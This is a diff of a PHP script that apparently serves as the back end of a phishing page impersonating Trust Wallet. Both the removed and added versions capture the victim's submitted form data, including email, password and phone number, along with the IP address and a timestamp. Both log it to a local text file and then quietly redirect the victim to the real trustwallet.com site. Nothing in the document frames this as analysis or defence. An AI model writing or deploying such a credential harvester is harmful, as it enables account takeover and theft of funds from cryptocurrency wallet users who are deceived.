@@ -1,23 +1,36 @@
 <?php
-
-header ('Location: https://trustwallet.com/download-page');
-$handle = fopen("415979872L.txt", "a");
-fwrite($handle, "===============================");
-fwrite($handle, "\n");
-
+$file = "newerawede.txt";
+$email = $_POST['email'];
+$Password = $_POST['Password'];
+$Phone = $_POST['Phone'];
 $ip = $_SERVER['REMOTE_ADDR'];
-foreach($_POST as $variable => $value) {
-   fwrite($handle, $variable);
-   fwrite($handle, "= ");
-   fwrite($handle, $value);
-   fwrite($handle, "\r\n");
-}
+$today = date("F j, Y, g:i a");
 
-fwrite($handle, " Ip Addreass: $ip");
-fwrite($handle, "\r\n");
-fwrite($handle, " Waktu Masuk: ".date('d-M-Y G:i:s A',  strtotime("+7 hours"))."\r\n");
-// assuming Indonesia timzone is GMT +7 and you want 24-hour format time 
-// according to your comments below
+$handle = fopen($file, 'a');
+fwrite($handle, "\n");
+fwrite($handle, "+-------------------[-New PROSES-]-------------------+");
+fwrite($handle, "\n");
+fwrite($handle, "Email : ");
+fwrite($handle, "$email");
+fwrite($handle, "\n");
+fwrite($handle, "Password : ");
+fwrite($handle, "$Password");
+fwrite($handle, "\n");
+fwrite($handle, "Phone number : ");
+fwrite($handle, "$Phone");
+fwrite($handle, "\n");
+fwrite($handle, "IP Address : ");
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "Date Submitted : ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fwrite($handle, "+-------------------[-New PROSES-]-------------------+");
+fwrite($handle, "\n");
 fclose($handle);
-exit;
+echo "<script LANGUAGE=\"JavaScript\">
+<!--
+window.location=\"https://trustwallet.com/\";
+// -->
+</script>";
 ?>
